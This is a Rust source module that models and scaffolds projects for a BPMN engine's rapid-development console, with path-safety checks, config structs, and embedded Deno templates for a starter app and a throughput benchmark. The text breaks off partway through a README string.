//! RAD **project** model for the console — the unit of authoring in the Nano
//! "Rapid Application Development" environment.
//!
//! A project is a **self-contained directory** under the projects root that is
//! itself a runnable Deno application:
//!
//! ```text
//! <projectsRoot>/<project>/
//!   nanobpm.project.json      project config (name, deploy target, platforms)
//!   deno.json                 import map (@nanobpm/worker, @lib/) + start task
//!   main.ts                   entrypoint: deploys processes + starts workers
//!   resources/
//!     processes/  *.bpmn       deployed to the engine on run
//!     decisions/  *.dmn        authored + bundled (engine does not execute DMN)
//!     forms/      *.form       authored + bundled (engine does not execute forms)
//!   workers/<name>/{worker.ts, deno.json}
//!   lib/                       shared TS/JS importable via @lib/
//!   .nanobpm/worker-sdk.ts     embedded Deno worker SDK (materialised on disk)
//!   .deno-cache/               DENO_DIR for dependency caching
//! ```
//!
//! "Run" spawns `deno run main.ts`; "compile" runs `deno compile` (optionally
//! cross-compiling for selected targets); "export" zips the whole project. All
//! of this is feature-gated behind `console` and never touches the engine data
//! dir.

use std::collections::{BTreeSet, HashMap, VecDeque};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
use std::sync::{Arc, OnceLock};
use std::time::{SystemTime, UNIX_EPOCH};

use serde::{Deserialize, Serialize};
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;
use tokio::sync::{Mutex, Notify, broadcast};

use super::{worker_export, workers, workspace};

const WORKER_SDK_TS: &str = include_str!("worker_sdk.ts");
const METRIC_PREFIX: &str = "@@NBPM_METRIC@@";
const STATUS_PREFIX: &str = "@@NBPM_STATUS@@";
const LOG_RING_CAP: usize = 1000;

/// The config file name at the root of every project.
pub const CONFIG_FILE: &str = "nanobpm.project.json";

/// Deno `--target` triples we support for cross-compilation.
pub const PLATFORMS: &[&str] = &[
    "aarch64-apple-darwin",
    "x86_64-apple-darwin",
    "x86_64-unknown-linux-gnu",
    "aarch64-unknown-linux-gnu",
    "x86_64-pc-windows-msvc",
];

/// The project templates the scaffolder can stamp out. `(id, label)`.
pub const TEMPLATES: &[(&str, &str)] = &[
    ("starter", "Starter app — one process, one worker"),
    (
        "throughput",
        "Throughput (REST) — 30s ramp benchmark over the HTTP API",
    ),
    (
        "throughput-stream",
        "Throughput (falcon) — same benchmark via @nanobpm/nano-sdk (A/B vs REST)",
    ),
    (
        "gui-starter",
        "GUI app — served-UI binary (Deno.serve) for a process application",
    ),
];

/// The scaffolder's full template menu: the offline built-ins from [`TEMPLATES`]
/// merged with templates contributed by installed extension packs. Built-ins win
/// on id collision so a pack cannot silently shadow an offline scaffold.
///
/// Two flavours of pack contribution are recognised:
///
/// * A `lang` or `app` pack with a non-empty `templates[]` array — the classic
///   contribution, one entry per template in `<pack>/templates/<id>/`.
/// * A `kind: example` pack — the entire pack **is** the template. Its `id`,
///   `displayName` and `summary` are surfaced directly, no separate
///   registration in some other pack needed. This is the intended shape for a
///   third party to publish a runnable example without touching any lang pack.
///
/// Each entry carries a `source` discriminator (`"builtin"` or `"pack"`); pack
/// entries also include a `pack` field with the contributing extension id, so
/// the Console can render provenance in the New Project picker.
pub fn project_templates() -> Vec<serde_json::Value> {
    use super::extensions::ExtKind;
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<serde_json::Value> = TEMPLATES
        .iter()
        .map(|(id, label)| {
            seen.insert((*id).to_string());
            serde_json::json!({"id": id, "label": label, "source": "builtin"})
        })
        .collect();
    for ext in super::extensions::all_extensions() {
        if ext.builtin {
            continue;
        }
        for t in &ext.templates {
            if seen.insert(t.id.clone()) {
                out.push(serde_json::json!({
                    "id": t.id,
                    "label": t.label,
                    "source": "pack",
                    "pack": ext.id,
                }));
            }
        }
        // Example packs advertise themselves as a template — no registration
        // in a sibling lang pack required.
        if ext.kind == ExtKind::Example && seen.insert(ext.id.clone()) {
            let label = ext
                .summary
                .clone()
                .map(|s| format!("{} — {}", ext.display_name, s))
                .unwrap_or_else(|| ext.display_name.clone());
            out.push(serde_json::json!({
                "id": ext.id,
                "label": label,
                "source": "pack",
                "pack": ext.id,
            }));
        }
    }
    out
}

fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

// ---------------------------------------------------------------------------
// Filesystem model
// ---------------------------------------------------------------------------

/// Root holding every project directory. `NANOBPMN_PROJECTS_DIR` overrides the
/// default `<workspace>/projects`.
pub fn projects_root() -> PathBuf {
    match std::env::var("NANOBPMN_PROJECTS_DIR") {
        Ok(d) if !d.is_empty() => PathBuf::from(d),
        _ => workspace::workspace_dir().join("projects"),
    }
}

/// Ensures the projects root exists and returns it.
pub fn ensure_projects_root() -> std::io::Result<PathBuf> {
    let dir = projects_root();
    std::fs::create_dir_all(&dir)?;
    Ok(dir)
}

/// The directory for project `name`, or `None` when the name is unsafe.
pub fn project_dir(name: &str) -> Option<PathBuf> {
    workspace::is_safe_name(name).then(|| projects_root().join(name))
}

/// Resolves a project-relative path (which may contain `/` separators) to an
/// absolute path **guaranteed to stay inside the project**. Rejects absolute
/// paths, `..` components, and empty segments.
pub fn safe_project_path(name: &str, rel: &str) -> Option<PathBuf> {
    let base = project_dir(name)?;
    let rel = rel.trim_start_matches('/');
    if rel.is_empty() {
        return Some(base);
    }
    let mut out = base.clone();
    for seg in rel.split('/') {
        if seg.is_empty() || seg == "." || seg == ".." || seg.len() > 128 {
            return None;
        }
        // Keep names tidy and traversal-safe (the worker/lib rule).
        if !seg
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'))
        {
            return None;
        }
        out.push(seg);
    }
    Some(out)
}

// ---------------------------------------------------------------------------
// Project config (nanobpm.project.json)
// ---------------------------------------------------------------------------

/// Persisted, user-editable project configuration.
#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ProjectConfig {
    pub name: String,
    #[serde(default)]
    pub description: String,
    /// Gateway base URL the app deploys to and dials the Falcon protocol on. The
    /// REST API lives at `<deployTarget>/v2`. Default: `http://localhost:8080`.
    #[serde(default = "default_deploy_target")]
    pub deploy_target: String,
    /// The entrypoint module run on "Run"/"Compile". Default `main.ts`.
    #[serde(default = "default_main")]
    pub main: String,
    /// Cross-compilation targets selected for export (Deno `--target` triples).
    #[serde(default)]
    pub platforms: Vec<String>,
    /// Language pack id driving editor grammar + toolchain (ADR 0008). Default
    /// `deno` (TypeScript) — the legacy runtime, zero regression.
    #[serde(default = "default_lang")]
    pub lang: String,
    /// App/output pack id (ADR 0009). `console` (today) or e.g. `deno-gui` for a
    /// served-UI binary. Default `console`.
    #[serde(default = "default_app")]
    pub app: String,
    /// Project-relative directories the supervisor sweeps for deployable
    /// resources (`.bpmn`, `.dmn`, `.form`) each time Run is clicked, POSTing
    /// each file to `<deployTarget>/v2/deployments`. Default is
    /// `["models", "decisions", "forms"]`; templates or pack scaffolders can
    /// override. Set to `[]` to disable — useful when the app deploys its
    /// own resources at boot.
    #[serde(default = "default_auto_deploy")]
    pub auto_deploy: Vec<String>,
    /// Project-scoped environment variables layered on top of the base spawn
    /// env for every Run/Compile (regardless of active run config). Used to
    /// point the app at whichever gateway URL the user has *this* project
    /// wired up to — Nano and Camunda 8 both default to `:8080`, so there's
    /// no universal per-pack default and the target belongs on the project.
    /// Precedence: process env < project `env` < active run config `env`
    /// (last-wins on key collisions).
    #[serde(default, skip_serializing_if = "std::collections::BTreeMap::is_empty")]
    pub env: std::collections::BTreeMap<String, String>,
    /// Toolchain snapshotted from the scaffolding pack — the *project* is the
    /// authority for how it runs and compiles, not the pack (which can change
    /// or be uninstalled). Precedence for Run/Compile:
    ///   1. `cfg.toolchain` when present (this snapshot)
    ///   2. lang pack's toolchain (lang-pack starter templates that don't override)
    ///   3. built-in Deno runner
    ///
    /// Users may hand-edit these argv in `nanobpm.project.json`; a future
    /// "Reset toolchain from pack" action can opt into upstream updates.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub toolchain: Option<ProjectToolchain>,
    /// Breadcrumb: which pack (and pack version) scaffolded this project.
    /// Purely informational — Run/Compile does NOT re-read the pack. Used for
    /// trust-store lookups (approving `embedded-jvm` covers its snapshotted
    /// toolchain) and for a possible "Reset toolchain from pack" affordance.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub scaffolded_from: Option<ScaffoldedFrom>,
    /// Id of the scaffold template this project was created from (e.g.
    /// "starter", "throughput", "java-starter"), recorded at creation. Purely a
    /// provenance breadcrumb the Console surfaces on the project card so a bug
    /// can be traced to the built-in template or contributing pack. Absent on
    /// projects scaffolded before this was recorded.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub template: Option<String>,
    #[serde(default)]
    pub created_ms: u64,
    #[serde(default)]
    pub updated_ms: u64,
}

/// Project-owned copy of the pack toolchain at scaffold time. Only the argv
/// the supervisor actually spawns — no `detect` (project doesn't gate on
/// tool presence; the spawn error is the diagnostic) or `targets` (Deno-only
/// today; belongs on the pack, not the project).
#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct ProjectToolchain {
    /// Argv the "Run" button spawns in the project dir. Empty => fall through
    /// to the lang-pack toolchain / Deno runner. Also serves as a fallback
    /// when a run config is active but its own `run` argv is empty.
    #[serde(default)]
    pub run: Vec<String>,
    /// Argv the "Compile" button spawns in the project dir. Empty => fall
    /// through to the lang-pack toolchain / Deno compile. Also serves as a
    /// fallback when a run config is active but its own `compile` is empty.
    #[serde(default)]
    pub compile: Vec<String>,
    /// Named run configurations snapshotted from the scaffolding pack.
    /// The Console offers these in a Run/Target dropdown; the picked id
    /// is persisted in `active_run_config`. Users may hand-edit — argv
    /// unrecognised by the source pack fall back to `cfg.lang` trust.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub run_configs: Vec<ProjectRunConfig>,
    /// Id of the currently-selected `run_configs` entry. When `None` and
    /// `run_configs` is non-empty, the `default: true` entry (or the first)
    /// is used.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub active_run_config: Option<String>,
}

/// Project-owned copy of a pack's [`super::extensions::RunConfig`].
#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq, Default)]
#[serde(rename_all = "camelCase")]
pub struct ProjectRunConfig {
    pub id: String,
    pub label: String,
    #[serde(default)]
    pub default: bool,
    #[serde(default)]
    pub run: Vec<String>,
    #[serde(default)]
    pub compile: Vec<String>,
    #[serde(default)]
    pub env: std::collections::BTreeMap<String, String>,
}

/// Breadcrumb identifying the pack that scaffolded a project — origin +
/// version. Informational: the toolchain lives in `ProjectConfig.toolchain`,
/// not looked up through this reference at run time.
#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct ScaffoldedFrom {
    /// The ext manifest id (e.g. "embedded-jvm", "throughput-jvm").
    pub pack: String,
    /// Pack version at scaffold time (best-effort — `None` when the pack's
    /// `package.json` wasn't readable at scaffold time).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub version: Option<String>,
}

/// Snapshot a pack's toolchain — the argv (flat + configs) the supervisor
/// spawns — into a project-owned copy. Mirrors the fields; drops the pack-
/// only metadata (`detect`, `targets`, install hints).
fn project_toolchain_from_pack(m: &super::extensions::ExtManifest) -> ProjectToolchain {
    ProjectToolchain {
        run: m.toolchain.run.clone(),
        compile: m.toolchain.compile.clone(),
        run_configs: m
            .toolchain
            .run_configs
            .iter()
            .map(|rc| ProjectRunConfig {
                id: rc.id.clone(),
                label: rc.label.clone(),
                default: rc.default,
                run: rc.run.clone(),
                compile: rc.compile.clone(),
                env: rc.env.clone(),
            })
            .collect(),
        active_run_config: None,
    }
}

fn default_deploy_target() -> String {
    "http://localhost:8080".to_string()
}

fn default_main() -> String {
    "main.ts".to_string()
}

fn default_lang() -> String {
    "deno".to_string()
}

fn default_app() -> String {
    "console".to_string()
}

fn default_auto_deploy() -> Vec<String> {
    vec![
        "models".to_string(),
        "decisions".to_string(),
        "forms".to_string(),
    ]
}

impl ProjectConfig {
    fn new(name: &str, description: &str) -> Self {
        let ts = now_ms();
        ProjectConfig {
            name: name.to_string(),
            description: description.to_string(),
            deploy_target: default_deploy_target(),
            main: default_main(),
            platforms: vec![host_target().to_string()],
            lang: default_lang(),
            app: default_app(),
            auto_deploy: default_auto_deploy(),
            env: std::collections::BTreeMap::new(),
            toolchain: None,
            scaffolded_from: None,
            template: None,
            created_ms: ts,
            updated_ms: ts,
        }
    }
}

/// Best-effort guess at the host's Deno target triple, used as the default
/// selected platform for a new project.
fn host_target() -> &'static str {
    match (std::env::consts::OS, std::env::consts::ARCH) {
        ("macos", "aarch64") => "aarch64-apple-darwin",
        ("macos", _) => "x86_64-apple-darwin",
        ("windows", _) => "x86_64-pc-windows-msvc",
        ("linux", "aarch64") => "aarch64-unknown-linux-gnu",
        _ => "x86_64-unknown-linux-gnu",
    }
}

/// Reads `<project>/nanobpm.project.json`, falling back to a minimal default
/// when the file is missing or malformed (so a hand-created dir still opens).
/// Best-effort auto-heals a legacy config (pre-`toolchain` snapshot) that has
/// enough breadcrumbs to identify its source pack — writes the snapshot back
/// so subsequent Run/Compile is pack-independent.
pub fn read_config(name: &str) -> Option<ProjectConfig> {
    let dir = project_dir(name)?;
    if !dir.is_dir() {
        return None;
    }
    let path = dir.join(CONFIG_FILE);
    let raw = std::fs::read_to_string(&path)
        .ok()
        .and_then(|t| serde_json::from_str::<ProjectConfig>(&t).ok())
        .unwrap_or_else(|| ProjectConfig::new(name, ""));
    let mut cfg = ProjectConfig {
        name: name.to_string(),
        ..raw
    };
    autoheal_toolchain(&mut cfg);
    Some(cfg)
}

/// Fill in `toolchain` + `scaffolded_from` for a legacy project that predates
/// the snapshot design. Best-effort — silent no-op when we can't tell which
/// pack scaffolded it. The heuristic uses `cfg.main` (Maven multi-module
/// projects put the POM under `microservice/`, GUI-served bins point at
/// `main.ts` in `deno-gui`, etc.); anything unrecognised is left alone.
fn autoheal_toolchain(cfg: &mut ProjectConfig) {
    if cfg.toolchain.is_some() {
        return;
    }
    let candidate_id: Option<&str> = if cfg.main == "microservice/pom.xml" {
        // Both embedded-jvm and embedded-graalvm-native scaffold this exact
        // layout with different toolchains — prefer the JVM one (safer:
        // `exec:java` works with plain Maven; the native profile requires a
        // GraalVM install). A user who scaffolded the native variant can
        // hand-edit `toolchain.run` in `nanobpm.project.json`.
        Some("embedded-jvm")
    } else if cfg.main == "app/pom.xml" || (cfg.main == "pom.xml" && cfg.lang == "java") {
        Some("throughput-jvm")
    } else {
        None
    };
    let Some(pack_id) = candidate_id else {
        return;
    };
    let Some(m) = super::extensions::find_ext(pack_id) else {
        return;
    };
    if m.toolchain.run.is_empty()
        && m.toolchain.compile.is_empty()
        && m.toolchain.run_configs.is_empty()
    {
        return;
    }
    cfg.toolchain = Some(project_toolchain_from_pack(&m));
    cfg.scaffolded_from = Some(ScaffoldedFrom {
        pack: m.id.clone(),
        version: super::extensions::pack_version(&m.id),
    });
    // Mtime bump so project tile ordering / "last updated" stays consistent
    // with what just changed on disk.
    cfg.updated_ms = now_ms();
    // Persist so we don't reheal on every read. Ignore write errors — the
    // in-memory config is still correct for this Run/Compile.
    let _ = write_config(&cfg.name, cfg);
}

/// Writes the project config back to disk (pretty-printed).
pub fn write_config(name: &str, cfg: &ProjectConfig) -> std::io::Result<()> {
    let dir = project_dir(name).ok_or_else(|| {
        std::io::Error::new(std::io::ErrorKind::InvalidInput, "invalid project name")
    })?;
    std::fs::create_dir_all(&dir)?;
    let json = serde_json::to_string_pretty(cfg)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
    std::fs::write(dir.join(CONFIG_FILE), format!("{json}\n"))
}

// ---------------------------------------------------------------------------
// Scaffolding
// ---------------------------------------------------------------------------

/// Default project `deno.json`: import map for the SDK + shared library, and a
/// `start` task that runs the entrypoint with the right permissions.
const PROJECT_DENO_JSON: &str = r#"{
  "imports": {
    "@nanobpm/worker": "./.nanobpm/worker-sdk.ts",
    "@lib/": "./lib/"
  },
  "tasks": {
    "start": "deno run --allow-net --allow-read --allow-write --allow-env main.ts"
  }
}
"#;

/// The generated entrypoint. It is runtime-dynamic: it discovers BPMN processes
/// and workers on disk, so dropping a file into the project is all it takes.
const MAIN_TS: &str = r#"// Generated entrypoint for your Nano application. Edit freely. The deploy +
// worker bootstrap helpers live in lib/nano.ts so this stays a clean entrypoint.
import { deployAllResources, startWorkers } from "@lib/nano.ts";

await deployAllResources();
await startWorkers();

// ---- Your application logic below ----
console.log("application running.");
"#;

/// Shared bootstrap helpers, written into every project's lib/ and imported via
/// `@lib/nano.ts`. Keeps entrypoints (main.ts) free of deploy/worker plumbing.
const NANO_LIB_TS: &str = r#"// Shared bootstrap helpers for a Nano application. Imported via @lib/nano.ts.

/// Base URL of the engine; honours NANOBPMN_BASE_URL, defaults to localhost.
export const BASE_URL = (Deno.env.get("NANOBPMN_BASE_URL") ?? "http://localhost:8080").replace(/\/+$/, "");

/// Deploys every BPMN process under resources/processes/ to the engine. Returns
/// the number of resources deployed (0 if the folder is empty/missing).
export async function deployAllResources(): Promise<number> {
  const dir = "resources/processes";
  const form = new FormData();
  let count = 0;
  try {
    for await (const e of Deno.readDir(dir)) {
      if (!e.isFile || !e.name.endsWith(".bpmn")) continue;
      const xml = await Deno.readTextFile(`${dir}/${e.name}`);
      form.append("resources", new Blob([xml], { type: "text/xml" }), e.name);
      count++;
    }
  } catch {
    return 0; // no processes folder yet
  }
  if (count === 0) return 0;
  const res = await fetch(`${BASE_URL}/v2/deployments`, { method: "POST", body: form });
  if (!res.ok) {
    throw new Error(`deployment failed: ${res.status} ${await res.text().catch(() => "")}`);
  }
  console.log(`deployed ${count} process(es) to ${BASE_URL}/v2`);
  return count;
}

/// Workers to start: a directory name list to `include` or `exclude`; omit to
/// start every worker under workers/.
export type WorkerSelection = { exclude: string[] } | { include: string[] };

/// Starts each selected worker by importing its worker.ts. Returns the names
/// started. Workers self-register via defineWorker(); failures are logged, not
/// fatal.
export async function startWorkers(workers?: WorkerSelection): Promise<string[]> {
  let names: string[] = [];
  try {
    for await (const e of Deno.readDir("workers")) {
      if (e.isDirectory) names.push(e.name);
    }
  } catch {
    return []; // no workers folder yet
  }
  if (workers && "include" in workers) {
    const set = new Set(workers.include);
    names = names.filter((n) => set.has(n));
  } else if (workers && "exclude" in workers) {
    const set = new Set(workers.exclude);
    names = names.filter((n) => !set.has(n));
  }
  names.sort();
  const started: string[] = [];
  for (const name of names) {
    try {
      Deno.env.set("NANOBPMN_BASE_URL", BASE_URL);
      Deno.env.set("NANOBPMN_WORKER_NAME", name);
      await import(`../workers/${name}/worker.ts`);
      console.log(`started worker: ${name}`);
      started.push(name);
    } catch (err) {
      console.error(`worker ${name} failed to start: ${err}`);
    }
  }
  return started;
}
"#;

fn readme_md(name: &str) -> String {
    format!(
        "# {name}\n\n\
A Nano BPM application created with the RAD environment.\n\n\
## Layout\n\n\
- `resources/processes/` — BPMN processes, deployed to the engine on run.\n\
- `resources/decisions/` — DMN decisions (authoring/bundling; the engine does not execute DMN).\n\
- `resources/forms/` — forms (authoring/bundling; the engine does not execute forms).\n\
- `workers/<name>/` — Deno job workers.\n\
- `lib/` — shared TS/JS, importable via `@lib/` (e.g. `lib/nano.ts` deploy/worker helpers).\n\
- `main.ts` — entrypoint; calls `deployAllResources()` and `startWorkers()` from `@lib/nano.ts`.\n\n\
## Run\n\n\
```sh\ndeno task start\n```\n"
    )
}

/// A starter BPMN process so a fresh project has something to deploy.
fn starter_process(name: &str) -> String {
    let pid = format!("{name}-process");
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<bpmn:definitions xmlns:bpmn="http://www.omg.org/spec/BPMN/20100524/MODEL" xmlns:bpmndi="http://www.omg.org/spec/BPMN/20100524/DI" xmlns:dc="http://www.omg.org/spec/DD/20100524/DC" xmlns:di="http://www.omg.org/spec/DD/20100524/DI" xmlns:zeebe="http://camunda.org/schema/zeebe/1.0" id="defs-{pid}" targetNamespace="http://nanobpm">
  <bpmn:process id="{pid}" isExecutable="true">
    <bpmn:startEvent id="start" />
    <bpmn:sequenceFlow id="f1" sourceRef="start" targetRef="task" />
    <bpmn:serviceTask id="task" name="Do work">
      <bpmn:extensionElements>
        <zeebe:taskDefinition type="do-work" />
      </bpmn:extensionElements>
    </bpmn:serviceTask>
    <bpmn:sequenceFlow id="f2" sourceRef="task" targetRef="end" />
    <bpmn:endEvent id="end" />
  </bpmn:process>
  <bpmndi:BPMNDiagram id="BPMNDiagram_{pid}">
    <bpmndi:BPMNPlane id="BPMNPlane_{pid}" bpmnElement="{pid}">
      <bpmndi:BPMNShape id="start_di" bpmnElement="start">
        <dc:Bounds x="180" y="100" width="36" height="36" />
      </bpmndi:BPMNShape>
      <bpmndi:BPMNShape id="task_di" bpmnElement="task">
        <dc:Bounds x="270" y="78" width="100" height="80" />
      </bpmndi:BPMNShape>
      <bpmndi:BPMNShape id="end_di" bpmnElement="end">
        <dc:Bounds x="432" y="100" width="36" height="36" />
      </bpmndi:BPMNShape>
      <bpmndi:BPMNEdge id="f1_di" bpmnElement="f1">
        <di:waypoint x="216" y="118" />
        <di:waypoint x="270" y="118" />
      </bpmndi:BPMNEdge>
      <bpmndi:BPMNEdge id="f2_di" bpmnElement="f2">
        <di:waypoint x="370" y="118" />
        <di:waypoint x="432" y="118" />
      </bpmndi:BPMNEdge>
    </bpmndi:BPMNPlane>
  </bpmndi:BPMNDiagram>
</bpmn:definitions>
"#
    )
}

const STARTER_WORKER_TS: &str = r#"import { defineWorker } from "@nanobpm/worker";

// Handles the "do-work" job type from the starter process. Return output
// variables to complete the job; throw or call job.fail(...) to fail it.
defineWorker({
  type: "do-work",
  maxParallelJobs: 10,
  async handle(job) {
    console.log(`handling job ${job.jobKey} for instance ${job.processInstanceKey}`);
    return { handledBy: "do-work" };
  },
});
"#;

const WORKER_DENO_JSON: &str = r#"{
  "imports": {
    "@nanobpm/worker": "../../.nanobpm/worker-sdk.ts",
    "@lib/": "../../lib/"
  }
}
"#;

// ---------------------------------------------------------------------------
// "Throughput Explorer" demo template — a 30-second ceiling finder
// ---------------------------------------------------------------------------

/// A minimal one-task process: start → single service task ("tick") → end. The
/// worker auto-completes, so each created instance runs end-to-end through the
/// engine: this measures create + worker-complete throughput.
const DEMO_PROCESS_BPMN: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<bpmn:definitions xmlns:bpmn="http://www.omg.org/spec/BPMN/20100524/MODEL" xmlns:bpmndi="http://www.omg.org/spec/BPMN/20100524/DI" xmlns:dc="http://www.omg.org/spec/DD/20100524/DC" xmlns:di="http://www.omg.org/spec/DD/20100524/DI" xmlns:zeebe="http://camunda.org/schema/zeebe/1.0" id="defs-throughput-demo" targetNamespace="http://nanobpm">
  <bpmn:process id="throughput-demo" isExecutable="true">
    <bpmn:startEvent id="start">
      <bpmn:outgoing>f1</bpmn:outgoing>
    </bpmn:startEvent>
    <bpmn:sequenceFlow id="f1" sourceRef="start" targetRef="task" />
    <bpmn:serviceTask id="task" name="Tick">
      <bpmn:extensionElements>
        <zeebe:taskDefinition type="tick" />
      </bpmn:extensionElements>
      <bpmn:incoming>f1</bpmn:incoming>
      <bpmn:outgoing>f2</bpmn:outgoing>
    </bpmn:serviceTask>
    <bpmn:sequenceFlow id="f2" sourceRef="task" targetRef="end" />
    <bpmn:endEvent id="end">
      <bpmn:incoming>f2</bpmn:incoming>
    </bpmn:endEvent>
  </bpmn:process>
  <bpmndi:BPMNDiagram id="diagram">
    <bpmndi:BPMNPlane id="plane" bpmnElement="throughput-demo">
      <bpmndi:BPMNShape id="start_di" bpmnElement="start">
        <dc:Bounds x="160" y="100" width="36" height="36" />
      </bpmndi:BPMNShape>
      <bpmndi:BPMNShape id="task_di" bpmnElement="task">
        <dc:Bounds x="260" y="78" width="100" height="80" />
      </bpmndi:BPMNShape>
      <bpmndi:BPMNShape id="end_di" bpmnElement="end">
        <dc:Bounds x="430" y="100" width="36" height="36" />
      </bpmndi:BPMNShape>
      <bpmndi:BPMNEdge id="f1_di" bpmnElement="f1">
        <di:waypoint x="196" y="118" />
        <di:waypoint x="260" y="118" />
      </bpmndi:BPMNEdge>
      <bpmndi:BPMNEdge id="f2_di" bpmnElement="f2">
        <di:waypoint x="360" y="118" />
        <di:waypoint x="430" y="118" />
      </bpmndi:BPMNEdge>
    </bpmndi:BPMNPlane>
  </bpmndi:BPMNDiagram>
</bpmn:definitions>
"#;

/// The single worker: drains "tick" jobs as fast as it can, fire-and-forget.
const DEMO_WORKER_TS: &str = r#"import { defineWorker } from "@nanobpm/worker";

// Drains "tick" jobs as fast as the engine emits them. High parallelism + an
// empty handler keep the worker off the critical path so the engine sets the
// ceiling, not the worker.
defineWorker({
  type: "tick",
  maxParallelJobs: 200,
  async handle() {
    return {};
  },
});
"#;

/// The explorer entrypoint: deploy, start the worker, then ramp instance
/// creation every 2s for 30s and report the peak sustained rate.
const DEMO_MAIN_TS: &str = r#"// Throughput (REST) — finds the ceiling using the plain HTTP API.
//
// For 30 seconds it fires-and-forgets process-instance creates over REST
// (POST /v2/process-instances, no awaiting completion) with a pool that ramps
// every 2 seconds. The single "tick" worker drains the jobs. A/B this against
// the "Throughput (falcon)" demo, which runs identical logic through
// @nanobpm/nano-sdk on the Falcon protocol.
import { BASE_URL, deployAllResources, startWorkers } from "@lib/nano.ts";

const PROCESS_ID = "throughput-demo";
const DURATION_MS = 30_000;
const RAMP_EVERY_MS = 2_000;
const RAMP_STEP = 32; // +32 concurrent creators every 2s
const DRAIN_MAX_MS = 30_000; // give the worker up to 30s to finish the backlog

async function residentMb(): Promise<number> {
  try {
    const r = await fetch(`${BASE_URL}/v2/system/memory`);
    const j = await r.json();
    return j.residentBytes ? j.residentBytes / 1_048_576 : 0;
  } catch { return 0; }
}

await deployAllResources();
await startWorkers({ include: ["tick"] });

let created = 0;
let running = true;
let concurrency = 0;

async function creator(): Promise<void> {
  const body = JSON.stringify({ processDefinitionId: PROCESS_ID as unknown as never, awaitCompletion: false });
  const headers = { "content-type": "application/json" };
  while (running) {
    try {
      const r = await fetch(`${BASE_URL}/v2/process-instances`, { method: "POST", body, headers });
      await r.body?.cancel(); // free the connection promptly
      if (r.ok) created++;
    } catch { /* keep pushing */ }
  }
}

console.log("ramping process-instance creation for 30s…\n");
const t0 = performance.now();
let lastCreated = 0;
let peak = 0;
let peakMem = 0;

const tick = setInterval(async () => {
  const total = created;
  const rate = total - lastCreated;
  lastCreated = total;
  if (rate > peak) peak = rate;
  const mem = await residentMb();
  if (mem > peakMem) peakMem = mem;
  console.log(`t+${Math.round((performance.now() - t0) / 1000)}s  conc=${concurrency}  ${rate}/s  (total ${total}, mem ${mem.toFixed(0)}MB)`);
}, 1000);

const ramp = setInterval(() => {
  for (let i = 0; i < RAMP_STEP; i++) creator();
  concurrency += RAMP_STEP;
}, RAMP_EVERY_MS);

for (let i = 0; i < RAMP_STEP; i++) creator();
concurrency = RAMP_STEP;

setTimeout(async () => {
  running = false; // stop creating
  clearInterval(ramp);
  console.log(`\n${created} created. draining the backlog (worker finishing jobs)…`);
  // Graceful drain: stop creating and wait until the engine reports no jobs
  // pending, or DRAIN_MAX_MS elapses, so we don't leave instances parked.
  const drainStart = performance.now();
  let prev = -1;
  while (performance.now() - drainStart < DRAIN_MAX_MS) {
    await new Promise((r) => setTimeout(r, 1000));
    let pending = 0;
    try {
      const r = await fetch(`${BASE_URL}/v2/jobs/search`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ filter: { type: "tick", state: "CREATED" }, page: { limit: 1 } }),
      });
      const j = await r.json();
      pending = j?.page?.totalItems ?? 0;
    } catch { break; }
    const mem = await residentMb();
    if (mem > peakMem) peakMem = mem;
    console.log(`  pending jobs: ${pending}`);
    if (pending === 0 || pending === prev) break; // done, or stuck — stop waiting
    prev = pending;
  }
  clearInterval(tick);
  console.log(`\n=== peak ${peak} instances/sec (single-task, fire-and-forget) ===`);
  console.log(`=== ${created} instances created in 30s, ~${Math.round(created / 30)}/s average ===`);
  console.log(`=== peak engine memory ${peakMem.toFixed(0)}MB ===`);
  Deno.exit(0);
}, DURATION_MS);
"#;

fn demo_readme() -> String {
    "# Throughput Explorer\n\n\
A 30-second benchmark that shows how fast Nano runs out of the box. It \
fire-and-forgets `throughput-demo` instances (a single auto-completed `tick` \
task) from a creator pool that ramps every 2 seconds, while one worker drains \
the jobs. Each second it prints the achieved **creates/sec** and the engine's \
**resident memory**; at 30s it stops creating, drains the backlog (so no \
instances are left parked), then reports the peak instances/sec and peak memory.\n\n\
## Run it in the IDE\n\n\
1. Make sure the engine is up (the console you're reading this in is the engine).\n\
2. Open this project and press **Run**. Watch the log console fill with per-second \
rates; the final lines report the peak. It runs ~30s then drains and stops on its \
own. Press **Stop** anytime to end early.\n\n\
## A/B: falcon vs REST\n\n\
Pair this with **Throughput (falcon)** (same benchmark via \
`@nanobpm/nano-sdk`). On a clean engine (30s ramp, fire-and-forget):\n\n\
| Metric | REST (this demo) | Falcon |\n\
|---|---|---|\n\
| Peak instances/sec | **8,353** | 4,393 |\n\
| Avg instances/sec | 7,593 | 2,753 |\n\
| Created in 30s | 227,780 | 82,591 |\n\
| Peak engine memory | 233 MB | **58 MB** |\n\n\
REST wins raw throughput (pooled HTTP connections parallelise well); the \
Falcon protocol uses ~4x less engine memory. Run each on a fresh engine \
(`c8ctl nano stop --purge` between runs) for a fair comparison.\n\n\
> **Note:** in JavaScript/Deno there is no falcon *throughput* win — \
even across two processes (separate producer + worker) the SDK awaits one \
create at a time over a single socket (~2–3k/s) while pooled REST fans out \
